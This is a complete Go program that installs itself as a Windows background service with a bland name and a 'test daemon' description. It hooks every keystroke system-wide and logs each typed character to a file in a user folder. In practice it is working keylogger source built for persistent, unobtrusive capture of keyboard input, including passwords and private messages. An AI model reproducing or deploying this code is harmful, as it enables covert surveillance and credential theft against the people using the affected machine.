package main

import (
	"log"
	"os"
	"time"

	hook "github.com/robotn/gohook"

	"github.com/kardianos/service"
)

const (
	name        = "buffgeJob"
	displayName = "buffge后台任务"
	description = "buffge go测试daemon"
	logPath     = "c:/users/buff/buffge.log"
)

func makeFile() {
	f, err := os.OpenFile(logPath, os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
	EvChan := hook.Start()
	defer hook.End()
	log.SetOutput(f)
	log.Println("正在监听hook")
	// 可以监听所有的事件
	for ev := range EvChan {
		if ev.Kind == hook.KeyDown {
			log.Print(ev.Keychar)
		}
	}
}

var logger service.Logger

type program struct{}

func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}
func (p *program) run() {
	makeFile()
}
func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	<-time.After(time.Second / 10)
	return nil
}

func main() {
	svcConfig := &service.Config{
		Name:        name,
		DisplayName: displayName,
		Description: description,
		Arguments:   []string{"start"},
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}
	logger, err = s.Logger(nil)
	if err != nil {
		log.Fatal(err)
	}
	switch os.Args[1] {
	case "install":
		if err := s.Install(); err == nil {
			log.Println("安装成功")
		} else {
			log.Println("安装失败", err)
		}
	case "uninstall":
		if err := s.Uninstall(); err == nil {
			log.Println("卸载成功")
		} else {
			log.Println("卸载失败", err)
		}
	case "stop":
		s.Stop()
	case "start":
		fallthrough
	default:
		err = s.Run()
		if err != nil {
			_ = logger.Error(err)
		}
	}
}
